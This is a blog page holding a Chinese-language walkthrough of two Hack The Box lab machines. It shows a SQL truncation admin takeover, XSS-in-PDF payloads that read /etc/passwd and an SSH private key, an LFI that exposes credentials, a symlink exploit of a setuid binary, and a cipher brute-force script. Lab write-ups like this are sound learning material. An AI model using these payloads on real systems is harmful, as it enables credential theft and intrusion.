@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <title>
+        Hackthebox Book and ForwardSlash - Naivekun&#39;s blog
+      </title>
+    <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport"
+    content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  
+  <meta name="theme-color" content="#000000" />
+  
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <meta name="description" content="Book 扫端口，只有80和22 80是个。。。图书cms 注册登录进入后台 没注入上传没法绕xss打了没反应 有个admin 注意到一段js 搜一下，发现了这" />
+  <meta name="generator" content="Hugo 0.70.0 with theme pure" />
+  <title>Hackthebox Book and ForwardSlash - Naivekun&#39;s blog</title>
+  
+  
+  <link rel="stylesheet" href="https://naivekun.com/css/style.min.7dc20efbc53647d41aa9ddea0c48e59300223d084e66ea0cbe7c30bd88903acc.css">
+  
+  <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/9.15.10/styles/github.min.css" async>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
+  <meta property="og:title" content="Hackthebox Book and ForwardSlash" />
+<meta property="og:description" content="Book 扫端口，只有80和22 80是个。。。图书cms 注册登录进入后台 没注入上传没法绕xss打了没反应 有个admin 注意到一段js 搜一下，发现了这" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://naivekun.com/2020/07/htb-book-and-forward-slash/" />
+<meta property="article:published_time" content="2020-07-13T21:39:34+08:00" />
+<meta property="article:modified_time" content="2020-07-13T21:39:34+08:00" />
+<meta itemprop="name" content="Hackthebox Book and ForwardSlash">
+<meta itemprop="description" content="Book 扫端口，只有80和22 80是个。。。图书cms 注册登录进入后台 没注入上传没法绕xss打了没反应 有个admin 注意到一段js 搜一下，发现了这">
+<meta itemprop="datePublished" content="2020-07-13T21:39:34&#43;08:00" />
+<meta itemprop="dateModified" content="2020-07-13T21:39:34&#43;08:00" />
+<meta itemprop="wordCount" content="1072">
+
+
+
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Hackthebox Book and ForwardSlash"/>
+<meta name="twitter:description" content="Book 扫端口，只有80和22 80是个。。。图书cms 注册登录进入后台 没注入上传没法绕xss打了没反应 有个admin 注意到一段js 搜一下，发现了这"/>
+
+  <!--[if lte IE 9]>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+    <![endif]-->
+
+  <!--[if lt IE 9]>
+      <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+      <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+    <![endif]-->
+
+</head>
+  </head>
+
+  
+  
+
+  <body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <div class="slimContent">
+      <div class="navbar-header">
+        <div class="profile-block text-center">
+          <a id="avatar" href="https://github.com/naivekun" target="_blank">
+            <img class="img-circle img-rotate" src="https://naivekun.com/avatar.jpg" width="200" height="200">
+          </a>
+          <h2 id="name" class="hidden-xs hidden-sm">naivekun</h2>
+          <h3 id="title" class="hidden-xs hidden-sm hidden-md">CTFer</h3>
+          <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i>Wuhan, China</small>
+        </div><div class="search" id="search-form-wrap">
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i
+                        class="icon icon-search"></i></button>
+            </span>
+        </div>
+        <div class="ins-search">
+            <div class="ins-search-mask"></div>
+            <div class="ins-search-container">
+                <div class="ins-input-wrapper">
+                    <input type="text" class="ins-search-input" placeholder="Type something..."
+                        x-webkit-speech />
+                    <button type="button" class="close ins-close ins-selectable" data-dismiss="modal"
+                        aria-label="Close"><span aria-hidden="true">×</span></button>
+                </div>
+                <div class="ins-section-wrapper">
+                    <div class="ins-section-container"></div>
+                </div>
+            </div>
+        </div>
+    </form>
+</div>
+        <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+      </div>
+      <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+        <ul class="nav navbar-nav main-nav">
+            <li class="menu-item menu-item-home">
+                <a href="/">
+                    <i class="icon icon-home-fill"></i>
+                  <span class="menu-title">Home</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-archives">
+                <a href="/posts/">
+                    <i class="icon icon-archives-fill"></i>
+                  <span class="menu-title">Archives</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-categories">
+                <a href="/categories/">
+                    <i class="icon icon-folder"></i>
+                  <span class="menu-title">Categories</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-tags">
+                <a href="/tags/">
+                    <i class="icon icon-tags"></i>
+                  <span class="menu-title">Tags</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-friends">
+                <a href="/friends/">
+                    <i class="icon icon-friendship"></i>
+                  <span class="menu-title">Friends</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-about">
+                <a href="/about/">
+                    <i class="icon icon-cup-fill"></i>
+                  <span class="menu-title">About</span>
+                </a>
+            </li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+<aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content"><script src="https://www.hackthebox.eu/badge/60818"></script>
+            </div>
+        </div>
+    </div>
+</div>
+
+      <div class="widget">
+    <h3 class="widget-title"> Categories</h3>
+    <div class="widget-body">
+        <ul class="category-list">
+            <li class="category-list-item"><a href="https://naivekun.com/categories/ctf/" class="category-list-link">ctf</a><span class="category-list-count">1</span></li>
+            <li class="category-list-item"><a href="https://naivekun.com/categories/hackthebox/" class="category-list-link">hackthebox</a><span class="category-list-count">13</span></li>
+            <li class="category-list-item"><a href="https://naivekun.com/categories/vulnhub/" class="category-list-link">vulnhub</a><span class="category-list-count">21</span></li>
+        </ul>
+    </div>
+</div>
+      <div class="widget">
+    <h3 class="widget-title"> Tags</h3>
+    <div class="widget-body">
+        <ul class="tag-list">
+            
+            
+            <li class="tag-list-item"><a href="https://naivekun.com/tags/ctf/" class="tag-list-link">ctf</a><span
+                    class="tag-list-count">2</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://naivekun.com/tags/hackthebox/" class="tag-list-link">hackthebox</a><span
+                    class="tag-list-count">13</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://naivekun.com/tags/vulnhub/" class="tag-list-link">vulnhub</a><span
+                    class="tag-list-count">21</span></li>
+            
+        </ul>
+
+    </div>
+</div>
+      
+<div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+        <ul class="recent-post-list list-unstyled no-thumbnail">
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://naivekun.com/2021/12/ma5671a-flash-openwrt/" class="title">68块钱MA5671A猫棒刷Openwrt</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2021-12-09 02:46:52 &#43;0800 &#43;0800" itemprop="datePublished">2021-12-09</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://naivekun.com/2020/10/hack-on-nrf/" class="title">nRF51系列单片机读取保护绕过</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-10-03 23:58:09 &#43;0800 &#43;0800" itemprop="datePublished">2020-10-03</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://naivekun.com/2020/08/hack-bmc/" class="title">一次对服务器主板IPMI BMC的漏洞挖掘</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-08-19 01:58:07 &#43;0800 &#43;0800" itemprop="datePublished">2020-08-19</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://naivekun.com/2020/07/tn3399-more/" class="title">TN3399板子填坑</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-07-23 18:03:36 &#43;0800 &#43;0800" itemprop="datePublished">2020-07-23</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://naivekun.com/2020/07/tn3399/" class="title">闲鱼便宜板子TN3399折腾全攻略</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-07-14 16:51:10 &#43;0800 &#43;0800" itemprop="datePublished">2020-07-14</time>
+                    </p>
+                </div>
+            </li>
+        </ul>
+    </div>
+</div>
+  </div>
+</aside>
+
+    
+    
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <h4 class="toc-title">Catalogue</h4>
+    <nav id="toc" class="js-toc toc">
+
+    </nav>
+  </div>
+</aside>
+<main class="main" role="main"><div class="content">
+  <article id="-" class="article article-type-" itemscope
+    itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      <h1 itemprop="name">
+  <a
+    class="article-title"
+    href="/2020/07/htb-book-and-forward-slash/"
+    >Hackthebox Book and ForwardSlash</a
+  >
+</h1>
+
+      <div class="article-meta">
+        
+<span class="article-date">
+  <i class="icon icon-calendar-check"></i>&nbsp;
+<a href="https://naivekun.com/2020/07/htb-book-and-forward-slash/" class="article-date">
+  <time datetime="2020-07-13 21:39:34 &#43;0800 &#43;0800" itemprop="datePublished">2020-07-13</time>
+</a>
+</span>
+
+
+        <span class="post-comment"><i class="icon icon-comment"></i>&nbsp;<a href="/2020/07/htb-book-and-forward-slash/#comments"
+            class="article-comment-link">Comments</a></span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 1072words</span>
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 3minutes </span>
+      </div>
+    </div>
+    <div class="article-entry marked-body js-toc-content" itemprop="articleBody">
+      <h1 id="book">Book</h1>
+<p>扫端口，只有80和22</p>
+<p>80是个。。。图书cms</p>
+<p>注册登录进入后台</p>
+<p><img src="/images/2020-07-13-19-01-52.png" alt=""></p>
+<p>没注入上传没法绕xss打了没反应</p>
+<p>有个admin</p>
+<p><img src="/images/2020-07-13-19-02-48.png" alt=""></p>
+<p>注意到一段js</p>
+<p><img src="/images/2020-07-13-19-07-23.png" alt=""></p>
+<p>搜一下，发现了这个https://resources.infosecinstitute.com/sql-truncation-attack/</p>
+<p>大概是，整个填充</p>
+<pre><code>admin@book.htb++++++a
+</code></pre>
+<p>select的时候会认为用户不存在，insert的时候超长了会给后面截断，变成<code>admin@book.htb++++++</code></p>
+<p>然后空格被忽略，从而修改admin密码</p>
+<p><img src="/images/2020-07-13-21-56-41.png" alt=""></p>
+<p>于是进了后台</p>
+<p><img src="/images/2020-07-13-21-57-47.png" alt=""></p>
+<p>发现有个导出pdf功能，普通用户上传的book会把标题和链接弄进去，注意到之前测xss填的书名<code>&lt;script&gt;alert(1);&lt;/script&gt;</code>居然没了，怀疑pdf会解析js</p>
+<p>写个document.write试试</p>
+<p><img src="/images/2020-07-13-22-01-19.png" alt=""></p>
+<p><img src="/images/2020-07-13-22-01-32.png" alt=""></p>
+<p>那xhr去读一下/etc/passwd</p>
+<p>这个东西居然不支持ES6。。。差评</p>
+<pre><code>&lt;script&gt;x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(&quot;GET&quot;,&quot;file:///etc/passwd&quot;);x.send();&lt;/script&gt;
+</code></pre>
+<p><img src="/images/2020-07-13-22-02-34.png" alt=""></p>
+<p>是可以读的</p>
+<p>读了一圈没啥东西，找私钥吧，发现reader用户私钥可以读出来</p>
+<pre><code>&lt;script&gt;x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(&quot;GET&quot;,&quot;file:///home/reader/.ssh/id_rsa&quot;);x.send();&lt;/script&gt;
+</code></pre>
+<p><img src="/images/2020-07-13-22-03-36.png" alt=""></p>
+<p>找个ocr网站识别一下，登录即可</p>
+<p><img src="/images/2020-07-13-22-04-59.png" alt=""></p>
+<p>收集一下信息发现有个log rotate，expdb找一下</p>
+<p><a href="https://www.exploit-db.com/exploits/47466">https://www.exploit-db.com/exploits/47466</a></p>
+<p>按照说明搞就提权了，略</p>
+<h1 id="forwardslash">ForwardSlash</h1>
+<p>还是只有80和22</p>
+<p>80搞了一通啥都没有</p>
+<p>测下子域名</p>
+<p><img src="/images/2020-07-13-22-12-15.png" alt=""></p>
+<p>有个backup</p>
+<p>注册登录，后台有个lfi</p>
+<p><img src="/images/2020-07-13-22-17-27.png" alt=""></p>
+<p>然后xjb读一波文件，发现dev/index.php有个凭据</p>
+<p><img src="/images/2020-07-13-22-33-17.png" alt=""></p>
+<pre><code>if (@ftp_login($conn_id, &quot;chiv&quot;, 'N0bodyL1kesBack/')) {
+    error_log(&quot;Getting file&quot;);
+    echo ftp_get_string($conn_id, &quot;debug.txt&quot;);
+}
+</code></pre>
+<p>用这个账号密码登ssh即可</p>
+<p>一通信息收集，发现一个backup目录，一个backup二进制文件</p>
+<p><img src="/images/2020-07-13-22-54-27.png" alt=""></p>
+<p>拉回来看看</p>
+<p><img src="/images/2020-07-13-22-59-08.png" alt=""></p>
+<p><img src="/images/2020-07-13-22-59-19.png" alt=""></p>
+<p>大概是取时间然后md5一下作为文件名，读取，然后输出</p>
+<p>那就是个任意文件读，因为有setuid</p>
+<p><img src="/images/2020-07-13-23-01-13.png" alt=""></p>
+<p>整个脚本</p>
+<pre><code>#!/bin/bash
+target=$1
+filename=$(./backup | grep ERROR | awk -F' ' '{print $2}')
+echo &quot;filename is $filename&quot;
+ln -s $target $filename
+./backup
+</code></pre>
+<p>然后成功读一波文件</p>
+<p>config.php.bak</p>
+<p><img src="/images/2020-07-13-23-22-10.png" alt=""></p>
+<p>user.txt</p>
+<p><img src="/images/2020-07-13-23-22-42.png" alt=""></p>
+<p>然后su到pain用户</p>
+<p>发现有个encryptor.py和一个加密后的文件</p>
+<pre><code>def encrypt(key, msg):
+    key = list(key)
+    msg = list(msg)
+    for char_key in key:
+        for i in range(len(msg)):
+            if i == 0:
+                tmp = ord(msg[i]) + ord(char_key) + ord(msg[-1])
+            else:
+                tmp = ord(msg[i]) + ord(char_key) + ord(msg[i-1])
+
+            while tmp &gt; 255:
+                tmp -= 256
+            msg[i] = chr(tmp)
+    return ''.join(msg)
+
+def decrypt(key, msg):
+    key = list(key)
+    msg = list(msg)
+    for char_key in reversed(key):
+        for i in reversed(range(len(msg))):
+            if i == 0:
+                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[-1]))
+            else:
+                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i-1]))
+            while tmp &lt; 0:
+                tmp += 256
+            msg[i] = chr(tmp)
+    return ''.join(msg)
+
+
+print encrypt('REDACTED', 'REDACTED')
+print decrypt('REDACTED', encrypt('REDACTED', 'REDACTED'))
+</code></pre>
+<p>这里是个自己写的加密，估计是要爆破key</p>
+<p>爆了半天没反应，但是发现奇怪的问题，他这个算法，只要key的首字母一样，长度一样，都能正常解密，如图</p>
+<p><img src="/images/2020-07-14-15-05-26.png" alt=""></p>
+<p>问了下密码学聚聚，大概是，解密的时候，后面错误密钥产生的偏移会让密钥第一个字符，也就是解密最后一轮，给减掉，也就是只要第一位正确就能正常解密</p>
+<p>所以搓了个解密脚本</p>
+<pre><code>import encrypter
+import string
+
+with open(&quot;ciphertext&quot;) as f:
+    data = f.read()
+
+for i in range(2,30):
+    for j in string.letters:
+        password = i*j
+        result = encrypter.decrypt(password, data)
+        if &quot; is &quot; in result:
+            print result
+</code></pre>
+<p>然后成功解密</p>
+<p><img src="/images/2020-07-14-15-11-56.png" alt=""></p>
+<p>另外注意到pain用户的sudo可以跑luks</p>
+<p>用解密的密码挂载磁盘</p>
+<p>如图</p>
+<p><img src="/images/2020-07-14-15-19-10.png" alt=""></p>
+<p>拿到私钥，直接用root登录即可</p>
+
+    </div>
+    <div class="article-footer">
+<blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    <li class="post-copyright-link hidden-xs">
+      <strong>Permalink: </strong>
+      <a href="https://naivekun.com/2020/07/htb-book-and-forward-slash/" title="Hackthebox Book and ForwardSlash" target="_blank" rel="external">https://naivekun.com/2020/07/htb-book-and-forward-slash/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>License：</strong><a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN</a>
+    </li>
+  </ul>
+</blockquote>
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/naivekun" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="https://naivekun.com/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/naivekun" target="_blank"><span class="text-dark">naivekun</span><small class="ml-1x">CTFer</small></a></h3>
+        <div>Web/Pentest/Android</div>
+      </div>
+    </figure>
+  </div>
+</div>
+    </div>
+  </article>
+<section id="comments">
+</section>
+
+</div><nav class="bar bar-footer clearfix" data-stick-bottom>
+    <div class="bar-inner">
+        <ul class="pager pull-left">
+            <li class="prev">
+                <a href="https://naivekun.com/2020/05/whuctf-2020-wp/" title="WHUCTF 2020 WriteUp"><i
+                        class="icon icon-angle-left"
+                        aria-hidden="true"></i><span>&nbsp;&nbsp;Older</span></a>
+            </li>
+            <li class="next">
+                <a href="https://naivekun.com/2020/07/tn3399/"
+                    title="闲鱼便宜板子TN3399折腾全攻略"><span>Newer&nbsp;&nbsp;</span><i
+                        class="icon icon-angle-right" aria-hidden="true"></i></a>
+            </li>
+            
+            <li class="toggle-toc">
+                <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false"
+                    title="Catalogue" role="button">
+                    <span>[&nbsp;</span><span>Catalogue</span>
+                    <i class="text-collapsed icon icon-anchor"></i>
+                    <i class="text-in icon icon-close"></i>
+                    <span>]</span>
+                </a>
+            </li>
+        </ul>
+        
+        <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal"
+            data-target="#donateModal"><span>$</span></button>
+        
+        <div class="bar-right">
+        </div>
+    </div>
+</nav>
+
+
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+    <div class="modal-dialog" role="document">
+        <div class="modal-content donate">
+            <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span
+                    aria-hidden="true">&times;</span></button>
+            <div class="modal-body">
+                <div class="donate-box">
+                    <div class="donate-head">
+                        <p>Maybe you could buy me a cup of coffee.</p>
+                    </div>
+                    <div class="tab-content">
+                        <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+                            <div class="donate-payimg">
+                                <img src="https://naivekun.com/donate/alipayimg.png"
+                                    alt="Scan Qrcode" title="Scan" />
+                            </div>
+                            <p class="text-muted mv">Scan this qrcode</p>
+                            <p class="text-grey">Open alipay app scan this qrcode, buy me a coffee!</p>
+                        </div>
+                        <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+                            <div class="donate-payimg">
+                                <img src="https://naivekun.com/donate/wechatpayimg.png"
+                                    alt="Scan Qrcode" title="Scan" />
+                            </div>
+                            <p class="text-muted mv">Scan this qrcode</p>
+                            <p class="text-grey">Open wechat app scan this qrcode, buy me a coffee!</p>
+                        </div>
+                    </div>
+                    <div class="donate-footer">
+                        <ul class="nav nav-tabs nav-justified" role="tablist">
+                            <li role="presentation" class="active">
+                                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay"
+                                    aria-expanded="true"><i class="icon icon-alipay"></i> alipay</a>
+                            </li>
+                            <li role="presentation" class="">
+                                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab"
+                                    aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i>
+                                    wechat payment</a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+</main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+<ul class="social-links">
+    <li><a href="https://github.com/naivekun" target="_blank" title="github" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-github"></i></a></li>
+    <li><a href="https://naivekun.com/index.xml" target="_blank" title="rss" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-rss"></i></a></li>
+</ul>
+  <div class="copyright">
+    &copy;&nbsp;2018  -
+    2021
+    <div class="publishby">
+        Theme by naivekun base on<a href="https://github.com/xiaoheiAh/hugo-theme-pure" target="_blank"> pure</a>.
+    </div>
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_SVG"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+            showMathMenu: false, //disables context menu
+            tex2jax: {
+            inlineMath: [ ['$','$'], ['\\(','\\)'] ]
+           }
+    });
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+<script>
+    window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/highlight.min.js"></script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/languages/python.min.js" defer></script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/languages/javascript.min.js" defer></script><script>
+    hljs.configure({
+        tabReplace: '    ', 
+        classPrefix: ''     
+        
+    })
+    hljs.initHighlightingOnLoad();
+</script>
+<script src="https://naivekun.com/js/application.min.bdeb64b910570b6c41badc6a05b7afb0c8ad9efd8525de3c7257d59e786326a3.js"></script>
+<script src="https://naivekun.com/js/plugin.min.51ff8c7317566f82259170fa36e09c4493adc9b9378b427a01ad3f017ebac7dd.js"></script>
+
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Pages',
+                CATEGORIES: 'Categories',
+                TAGS: 'Tags',
+                UNTITLED: '(Untitled)',
+            },
+            ROOT_URL: 'https:\/\/naivekun.com',
+            CONTENT_URL: 'https:\/\/naivekun.com\/searchindex.json ',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script type="text/javascript" src="https://naivekun.com/js/insight.min.a343cd9a5a7698336b28ef3a7c16a3a1b1d2d5fb17dc8ed04022bbe08cc5459073a15bdafa3a8a58cdd56080784bdd69fa70b1ae8597565c799c57ed00f0e120.js" defer></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+<script>
+    tocbot.init({
+        
+        tocSelector: '.js-toc',
+        
+        contentSelector: '.js-toc-content',
+        
+        headingSelector: 'h1, h2, h3',
+        
+        hasInnerContainers: true,
+    });
+</script>
+
+
+  </body>
+</html>
